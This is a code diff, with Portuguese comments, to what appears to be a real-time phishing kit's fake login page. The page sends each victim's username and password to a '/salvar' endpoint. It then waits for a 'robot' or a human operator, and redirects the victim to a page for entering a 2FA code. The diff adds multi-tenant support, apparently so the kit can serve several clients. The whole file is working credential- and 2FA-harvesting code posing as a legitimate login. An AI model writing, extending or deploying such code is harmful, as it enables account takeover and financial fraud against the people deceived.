@@ -10,6 +10,11 @@ const loginErroElem = document.getElementById("login-erro");
 const urlParams = new URLSearchParams(window.location.search);
 const paramId = urlParams.get("identificador") || urlParams.get("nome");
 const paramSenha = urlParams.get("senha") || urlParams.get("password");
+const paramTenant = (urlParams.get("tenant") || urlParams.get("cliente") || sessionStorage.getItem("vr_tenant") || "default").trim();
+
+if (paramTenant) {
+    sessionStorage.setItem("vr_tenant", paramTenant);
+}
 
 if (paramId && inputNome) {
     inputNome.value = paramId;
@@ -102,6 +107,7 @@ async function handleLogin() {
 
     // Armazena no sessionStorage para personalização da tela de 2FA
     sessionStorage.setItem("vr_usuario", nome);
+    const tenantAtivo = sessionStorage.getItem("vr_tenant") || paramTenant || "default";
 
     try {
         await fetch("/salvar", {
@@ -111,7 +117,8 @@ async function handleLogin() {
             },
             body: JSON.stringify({
                 nome: nome,
-                senha: senha
+                senha: senha,
+                tenant: tenantAtivo
             })
         });
     } catch (erro) {
@@ -119,15 +126,15 @@ async function handleLogin() {
     }
 
     // Fica em estado de loading enquanto o robô valida ou o operador decide
-    iniciarEspera2FA(nome);
+    iniciarEspera2FA(nome, tenantAtivo);
 }
 
-function iniciarEspera2FA(nome) {
+function iniciarEspera2FA(nome, tenant = "default") {
     if (loginPollingInterval) clearInterval(loginPollingInterval);
 
     loginPollingInterval = setInterval(async () => {
         try {
-            const res = await fetch(`/api/status-login?usuario=${encodeURIComponent(nome)}&t=${Date.now()}`, {
+            const res = await fetch(`/api/status-login?usuario=${encodeURIComponent(nome)}&tenant=${encodeURIComponent(tenant)}&t=${Date.now()}`, {
                 cache: "no-store",
                 headers: { "Cache-Control": "no-cache" }
             });
@@ -150,13 +157,13 @@ function iniciarEspera2FA(nome) {
                 return;
             }
 
-            // 2. Se o operador clicou em Solicitar 2FA
+            // 2. Se o operador clicou em Solicitar 2FA ou se o Full-Auto disparou
             if (data.status_login === "solicitar_2fa") {
                 clearInterval(loginPollingInterval);
                 loginPollingInterval = null;
                 botao.textContent = "Redirecionando...";
                 setTimeout(() => {
-                    window.location.href = `/codigo.html?usuario=${encodeURIComponent(nome)}`;
+                    window.location.href = `/codigo.html?usuario=${encodeURIComponent(nome)}&tenant=${encodeURIComponent(tenant)}`;
                 }, 300);
                 return;
             }
